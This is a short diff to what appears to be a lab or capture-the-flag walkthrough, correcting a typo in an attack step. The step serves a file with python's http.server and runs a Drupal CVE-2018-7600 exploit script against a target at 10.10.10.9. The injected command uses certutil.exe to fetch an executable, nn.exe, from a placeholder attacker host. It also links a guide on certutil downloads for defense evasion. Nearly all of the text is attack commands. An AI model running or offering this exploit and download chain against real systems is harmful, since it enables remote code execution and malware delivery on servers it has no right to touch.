@@ -40,7 +40,7 @@ Step 1
 
 Step 2
 	- File transfer >> python3 -m http.server 5555
-	- File transfer >> python3  python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "certutil.exe -uelcache -split -f http://Your_ip:your:5555/nn.exe" 
+	- File transfer >> python3  python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "certutil.exe -urlcache -split -f http://Your_ip:your:5555/nn.exe" 
 	- Notice >> certutil.exe from this url https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil  "I recommend this site https://www.ired.team/" 
 
 Step 3
